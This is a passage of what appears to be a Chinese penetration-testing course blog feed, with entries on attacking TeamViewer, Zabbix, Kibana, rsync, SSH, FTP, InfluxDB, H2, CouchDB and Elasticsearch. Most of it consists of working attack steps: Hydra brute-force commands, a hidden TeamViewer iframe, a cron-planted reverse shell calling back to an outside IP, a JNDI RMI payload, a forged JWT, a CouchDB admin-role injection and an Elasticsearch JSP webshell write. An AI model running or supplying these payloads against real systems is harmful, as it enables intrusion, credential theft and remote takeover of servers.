class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">​    <span class="tag">&lt;<span class="name">title</span>&gt;</span>cve-2020-13699<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome to xiaodi!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;height:1px;width:1px;&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;teamviewer10: --play \\attacker-IP\share\fake.tvs&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="VNC-口令问题-amp-未授权"><a href="#VNC-口令问题-amp-未授权" class="headerlink" title="-VNC 口令问题&amp;未授权"></a>-VNC 口令问题&amp;未授权</h6><p>MSF内置口令及未授权测试</p><p>复现链接：(<a href="https://blog.csdn.net/weixin_40412037/article/details/120437843">https://blog.csdn.net/weixin_40412037/article/details/120437843</a>)</p><h4 id="设备平台-Zabbix-CVE-2022-23131"><a href="#设备平台-Zabbix-CVE-2022-23131" class="headerlink" title="#设备平台-Zabbix-CVE-2022-23131"></a>#设备平台-Zabbix-CVE-2022-23131</h4><p>Zabbix 是由Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。是一款服务器监控软件，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。默认端口：10051</p><p>复现链接：(<a href="https://blog.csdn.net/weixin_50464560/article/details/123154050">https://blog.csdn.net/weixin_50464560/article/details/123154050</a>)</p><p>Zabbix CVE-2022-23131 登录绕过漏洞复现</p><p>脚本：<a href="https://github.com/L0ading-x/cve-2022-23131">https://github.com/L0ading-x/cve-2022-23131</a></p><p>执行：python3 zabbix.py target Admin</p><p>然后修改Cookie，使用saml登录即可</p><p>CVE-2017-2824 CVE-2020-11800（这两个没有什么价值）</p><h4 id="设备平台-Kibana-CVE-2019-7609"><a href="#设备平台-Kibana-CVE-2019-7609" class="headerlink" title="#设备平台-Kibana-CVE-2019-7609"></a>#设备平台-Kibana-CVE-2019-7609</h4><p>Kibana为Elassticsearch设计的一款开源的视图工具。其5.6.15和6.6.1之前的版本中存在一处原型链污染漏洞，利用漏洞可以在目标服务器上执行任意代码。默认端口：5601</p><p><a href="https://github.com/LandGrey/CVE-2019-7609">https://github.com/LandGrey/CVE-2019-7609</a></p><p>用脚本抽选一个测试，发现失败</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312004809566.png" alt="image-20230312004809566"></p><p>用FofaViewer批量化操作，复制到ips.txt里面置于脚本目录下</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005005975.png" alt="image-20230312005005975"></p><p>编写批量化脚本，先试着打印出ips的内容</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005110129.png" alt="image-20230312005110129"></p><p>但是每个ip间都有空格</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005158117.png" alt="image-20230312005158117"></p><p>去掉空行</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005253941.png" alt="image-20230312005253941"></p><p>完整代码执行实现批量扫（脚本都在同一目录下）</p><p><img src="/../images/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/image-20230312005444474.png" alt="image-20230312005444474"></p><p>.es(*).props(label.<strong>proto</strong>.env.AAAA&#x3D;’require(“child_process”).exec(“&#x2F;bin&#x2F;touch &#x2F;tmp&#x2F;success”);process.exit()&#x2F;&#x2F;‘) .props(label.<strong>proto</strong>.env.NODE_OPTIONS&#x3D;’–require &#x2F;proc&#x2F;self&#x2F;environ’)</p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day57 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</title>
      <link href="/2023/03/11/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/"/>
      <url>/2023/03/11/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、服务攻防-远程控制&amp;文件传输等</p><p>2、远程控制-RDP&amp;RDP&amp;弱口令&amp;漏洞</p><p>3、文件传输-FTP&amp;Rsync&amp;弱口令&amp;漏洞</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见服务应用的安全测试：</p><p>1、配置不当-未授权访问</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>应用服务安全测试流程：见图</p><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 口令猜解-Hydra-FTP&amp;RDP&amp;SSH</p><p>➢ 配置不当-未授权访问-Rsync文件备份</p><p>➢ 高端课程-直接搜哈-MSF&amp;Fofaviewer</p><p>➢ 协议漏洞-应用软件-FTP&amp;Proftpd搭建</p><p>➢ 协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</p><h4 id="口令猜解-Hydra-FTP-amp-RDP-amp-SSH"><a href="#口令猜解-Hydra-FTP-amp-RDP-amp-SSH" class="headerlink" title="#口令猜解-Hydra-FTP&amp;RDP&amp;SSH"></a>#口令猜解-Hydra-FTP&amp;RDP&amp;SSH</h4><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p><p>hydra是一个自动化的爆破工具，暴力破解弱密码，</p><p>是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可</p><p>-s PORT 可通过这个参数指定非默认端口。</p><p>-l LOGIN 指定破解的用户，对特定用户破解。</p><p>-L FILE 指定用户名字典。</p><p>-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</p><p>-P FILE 大写，指定密码字典。</p><p>-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</p><p>-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L&#x2F;-P参数。</p><p>-M FILE 指定目标列表文件一行一条。</p><p>-o FILE 指定结果输出文件。</p><p>-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</p><p>-t TASKS 同时运行的线程数，默认为16。</p><p>-w TIME 设置最大超时的时间，单位秒，默认是30s。</p><p>-v &#x2F; -V 显示详细过程。</p><p>server 目标ip</p><p>service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</p><p>例子：</p><p>FTP：文件传输协议</p><p>RDP：Windows远程桌面协议</p><p>SSH：Linux安全外壳协议</p><p>hydra -L test -P 10top1K.txt 47.110.53.159 ftp -V</p><p>hydra -l root -P 10top1K.txt 47.110.53.159 ssh -V</p><p>hydra -l administrator -P 10top1K.txt 47.110.53.159 rdp -V</p><h4 id="配置不当-未授权访问-Rsync文件备份"><a href="#配置不当-未授权访问-Rsync文件备份" class="headerlink" title="#配置不当-未授权访问-Rsync文件备份"></a>#配置不当-未授权访问-Rsync文件备份</h4><p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p><p>判断：rsync rsync:&#x2F;&#x2F;123.58.236.76:12155&#x2F;</p><p>存在漏洞</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311144602138.png" alt="image-20230311144602138"></p><p>利用：</p><p>-读取文件：rsync rsync:&#x2F;&#x2F;123.58.236.76:45854&#x2F;src&#x2F;</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311144927269.png" alt="image-20230311144927269"></p><p>-下载文件：rsync -av rsync:&#x2F;&#x2F;123.58.236.76:45854&#x2F;src&#x2F;etc&#x2F;passwd .&#x2F;</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311144911642.png" alt="image-20230311144911642"></p><p>-上传文件：rsync -av passwd rsync:&#x2F;&#x2F;123.58.236.76:45854&#x2F;src&#x2F;tmp&#x2F;passwd</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311145102157.png" alt="image-20230311145102157"></p><p>反弹shell：（把文件传到其计时任务，当计时任务到达就会执行）</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311145314694.png" alt="image-20230311145314694"></p><p>1、获取crontab配置文件信息</p><p>查看crontab配置文件：rsync rsync:&#x2F;&#x2F;192.168.91.130&#x2F;src&#x2F;etc&#x2F;crontab</p><p>下载crontab配置文件：rsync -av rsync:&#x2F;&#x2F;192.168.91.130&#x2F;src&#x2F;etc&#x2F;crontab &#x2F;root&#x2F;cron.txt</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311150722053.png" alt="image-20230311150722053"></p><p>查看内容：cat &#x2F;root&#x2F;cron.txt</p><p>其中的17 * * * * root cd &#x2F; &amp;&amp; run-parts –report &#x2F;etc&#x2F;cron.hourly表示在每小时的第17分钟执行run-parts –report &#x2F;etc&#x2F;cron.hourly命令</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311150341236.png" alt="image-20230311150341236"></p><p>2.创建文件 </p><p>touch shell </p><p>vim shell 写入以下内容</p><p>&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566 0&gt;&amp;1</p><p>chmod +x shell给文件赋予执行权限</p><p>3、上传文件 </p><p>上传：rsync -av shell rsync:&#x2F;&#x2F;123.58.236.76:12177&#x2F;src&#x2F;etc&#x2F;cron.hourly </p><p>查看是否上传了：rsync rsync:&#x2F;&#x2F;123.58.236.76:45854&#x2F;src&#x2F;etc</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311151451468.png" alt="image-20230311151451468"></p><p>4、等待接受反弹</p><h4 id="高端课程-直接搜哈-MSF-amp-Fofaviewer"><a href="#高端课程-直接搜哈-MSF-amp-Fofaviewer" class="headerlink" title="#高端课程-直接搜哈-MSF&amp;Fofaviewer"></a>#高端课程-直接搜哈-MSF&amp;Fofaviewer</h4><p><a href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a></p><p>msfconsole</p><p>use auxiliary&#x2F;scanner&#x2F;rsync&#x2F;modules_list</p><p>set rhosts file:&#x2F;root&#x2F;ips.txt</p><p>set threads 10</p><p>run</p><h4 id="协议漏洞-应用软件-FTP-amp-Proftpd搭建"><a href="#协议漏洞-应用软件-FTP-amp-Proftpd搭建" class="headerlink" title="#协议漏洞-应用软件-FTP&amp;Proftpd搭建"></a>#协议漏洞-应用软件-FTP&amp;Proftpd搭建</h4><p><a href="https://github.com/t0kx/exploit-CVE-2015-3306">https://github.com/t0kx/exploit-CVE-2015-3306</a></p><p>python exploit.py –host 123.58.236.76 –port 24967 –path “&#x2F;var&#x2F;www&#x2F;html&#x2F;“</p><p><a href="http://123.58.236.76:19758/backdoor.php?cmd=id">http://123.58.236.76:19758/backdoor.php?cmd=id</a></p><h4 id="协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh"><a href="#协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh" class="headerlink" title="#协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh"></a>#协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</h4><p>-Openssh CVE-2014-0160 CVE-2018-15473 cve_2020_15778</p><p>CVE-2014-0160 版本很少</p><p>cve_2020_15778 价值不高</p><p>CVE-2018-15473-用户名枚举</p><p><a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></p><p>pip3 install -r requirements.txt</p><p>pip3 install paramiko&#x3D;&#x3D;2.4.1</p><p>python sshUsernameEnumExploit.py –port 32013 –userList exampleInput.txt 123.58.236.76</p><p>-libssh 身份验证绕过（CVE-2018-10933）</p><p><a href="https://www.seebug.org/vuldb/ssvid-97614">https://www.seebug.org/vuldb/ssvid-97614</a></p><p>python libssh.py 123.58.236.76 55190 “id”</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311162430116.png" alt="image-20230311162430116"></p><p>下载exp执行</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311162657726.png" alt="image-20230311162657726"></p><p>执行whoami</p><p><img src="/../images/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/image-20230311162726290.png" alt="image-20230311162726290"></p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day56 服务攻防-数据库安全&amp;H2&amp;Elasticsearch&amp;CouchDB&amp;Influxdb复现</title>
      <link href="/2023/03/11/Day56-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-H2-Elasticsearch-CouchDB-Influxdb%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/03/11/Day56-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-H2-Elasticsearch-CouchDB-Influxdb%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、服务攻防-数据库类型安全</p><p>2、influxdb-未授权访问-jwt验证</p><p>3、H2database-未授权访问-配置不当</p><p>4、CouchDB-权限绕过配合RCE-漏洞</p><p>5、ElasticSearch-文件写入&amp;RCE-漏洞</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见服务应用的安全测试：</p><p>1、配置不当-未授权访问</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>应用服务安全测试流程：见图</p><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ Influxdb-未授权访问-Jwt验证不当</p><p>➢ H2database-未授权访问-配置不当</p><p>➢ CouchDB-权限绕过配合RCE-漏洞</p><p>➢ ElasticSearch-文件写入&amp;RCE-漏洞</p><h4 id="Influxdb-未授权访问-Jwt验证不当"><a href="#Influxdb-未授权访问-Jwt验证不当" class="headerlink" title="#Influxdb-未授权访问-Jwt验证不当"></a>#Influxdb-未授权访问-Jwt验证不当</h4><p>复现链接：(<a href="https://blog.csdn.net/weixin_44037296/article/details/118754782">https://blog.csdn.net/weixin_44037296/article/details/118754782</a>)</p><p>默认端口：8086 8088</p><p>influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。</p><p>漏洞复现：</p><p>靶场vulhub</p><p>1、借助<a href="https://jwt.io/%E6%9D%A5%E7%94%9F%E6%88%90jwt">https://jwt.io/来生成jwt</a> token，其中，<code>admin</code>是一个已经存在的用户，<code>exp</code>是一个时间戳，代表着这个token的过期时间，你需要设置为一个未来的时间戳</p><p>{</p><p>  “alg”: “HS256”,</p><p>  “typ”: “JWT”</p><p>}</p><p>{</p><p>  “username”: “admin”,</p><p>  “exp”: 1676346267</p><p>}</p><p><img src="/../images/Day56-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-H2-Elasticsearch-CouchDB-Influxdb%E5%A4%8D%E7%8E%B0/image-20230311115007574.png" alt="image-20230311115007574"></p><p>2、发送数据包触发未授权</p><p><code>POST /query HTTP/1.1</code><br><code>Host: your-ip</code><br><code>Accept-Encoding: gzip, deflate</code><br><code>Accept: */*</code><br><code>Accept-Language: en</code><br><code>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A</code><br><code>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</code><br><code>Connection: close</code><br><code>Content-Type: application/x-www-form-urlencoded</code></p><p><code>Content-Length: 22</code></p><p><code>db=sample&amp;q=show users</code></p><p>访问admin成功:</p><p><img src="/../images/Day56-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-H2-Elasticsearch-CouchDB-Influxdb%E5%A4%8D%E7%8E%B0/image-20230311115220726.png" alt="image-20230311115220726"></p><h4 id="H2database-未授权访问-配置不当"><a href="#H2database-未授权访问-配置不当" class="headerlink" title="#H2database-未授权访问-配置不当"></a>#H2database-未授权访问-配置不当</h4><p>复现链接：(<a href="https://blog.csdn.net/weixin_40602516/article/details/113265569">https://blog.csdn.net/weixin_40602516/article/details/113265569</a>)</p><p>默认端口：20051</p><p>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：默认端口：</p><p>spring.h2.console.enabled&#x3D;true </p><p>spring.h2.console.settings.web-allow-others&#x3D;true </p><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><p>1、下载JNDI-Injection-Exploit</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>2、生成执行RMI Payload-URL</p><p>-C 执行命令 -A 服务器地址</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch &#x2F;tmp&#x2F;success -A 47.94.236.117</p><p>3、填入URL提交执行</p><p>javax.naming.InitialContext</p><p>rmi:&#x2F;&#x2F;47.94.236.117:1099&#x2F;kd1rns</p><h4 id="CouchDB-权限绕过配合RCE-漏洞"><a href="#CouchDB-权限绕过配合RCE-漏洞" class="headerlink" title="#CouchDB-权限绕过配合RCE-漏洞"></a>#CouchDB-权限绕过配合RCE-漏洞</h4><ul><li><p>CouchDB是一个：<br>类似于MongoDB的文档数据库</p><p>支持分布式扩展操作，具有容错机制<br>CouchDB对数据库的操作，主要都是通过http接口来操作的，也提供了一个web管理面板</p></li></ul><p>复现链接：(<a href="https://blog.csdn.net/YouthBelief/article/details/121144202">https://blog.csdn.net/YouthBelief/article/details/121144202</a>)</p><p>默认端口：5984</p><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）</p><p>-CouchDB-权限绕过-CVE-2017-12635</p><p>1、先创建用户</p><p>Post:&#x2F;_users&#x2F;org.couchdb.user:vulhub</p><p>{<br>  “type”: “user”,<br>  “name”: “vulhub”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “vulhub”</p><p>}</p><p>2、登录用户授权</p><p>Get:&#x2F;_utils&#x2F;</p><p>vulhub vulhub</p><p>-CouchDB-权限绕过RCE-CVE-2017-12636</p><p>1、下载exp.py</p><p>2、修改目标和反弹地址</p><p>3、Python3调用执行即可</p><p><a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p><h4 id="ElasticSearch-文件写入-amp-RCE-漏洞"><a href="#ElasticSearch-文件写入-amp-RCE-漏洞" class="headerlink" title="#ElasticSearch-文件写入&amp;RCE-漏洞"></a>#ElasticSearch-文件写入&amp;RCE-漏洞</h4><p><strong>Elasticsearch</strong>是一个<strong>基于Lucene的搜索服务器</strong>。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。<strong>Elasticsearch</strong>是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。</p><p>复现链接：(<a href="https://blog.csdn.net/m0_58434634/article/details/117338428">https://blog.csdn.net/m0_58434634/article/details/117338428</a>)</p><p>默认端口：9200 9300</p><p>-Elasticsearch RCE CVE-2014-3120</p><p>1、漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据</p><p><code>POST /website/blog/ HTTP/1.1</code><br><code>Host: your-ip:9200</code><br><code>Accept: */*</code><br><code>Accept-Language: en</code><br><code>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</code><br><code>Connection: close</code><br><code>Content-Type: application/x-www-form-urlencoded</code><br><code>Content-Length: 25</code></p><p><code>&#123;</code></p><p>  <code>&quot;name&quot;: &quot;xiaodi&quot;</code></p><p><code>&#125;</code></p><p>接发包触发执行命令</p><p>-Elasticsearch 文件写入 wooyun_2015_110216</p><p>9200一般为ElasticSearch的常用端口，此漏洞环境需要与中间件使用</p><p>1、发现9200端口存在elasticsearch页面，8080存在tomcat目录</p><p>2、利用ElasticSearch写入后门到&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;wwwroot&#x2F;</p><p>curl -XPOST <a href="http://123.58.236.76:31556/yz.jsp/yz.jsp/1">http://123.58.236.76:31556/yz.jsp/yz.jsp/1</a> -d’</p><p>{“&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;”:”test”}</p><p>‘</p><p>curl -XPUT ‘<a href="http://123.58.236.76:31556/_snapshot/yz.jsp">http://123.58.236.76:31556/_snapshot/yz.jsp</a>‘ -d ‘{</p><p>​     “type”: “fs”,</p><p>​     “settings”: {</p><p>​          “location”: “&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;wwwroot&#x2F;“,</p><p>​          “compress”: false</p><p>​     }</p><p>}’</p><p>curl -XPUT “<a href="http://123.58.236.76:31556/_snapshot/yz.jsp/yz.jsp">http://123.58.236.76:31556/_snapshot/yz.jsp/yz.jsp</a>“ -d ‘{</p><p>​     “indices”: “yz.jsp”,</p><p>​     “ignore_unavailable”: “true”,</p><p>​     “include_global_state”: false</p><p>}’</p><p>3、访问8080端口snapshot-yz.jsp文件写入代码到test.jsp中</p><p><a href="http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success">http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</a></p><p><a href="http://123.58.236.76:31557/wwwroot/test.jsp">http://123.58.236.76:31557/wwwroot/test.jsp</a></p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day55 服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysql&amp;未授权访问&amp;RCE</title>
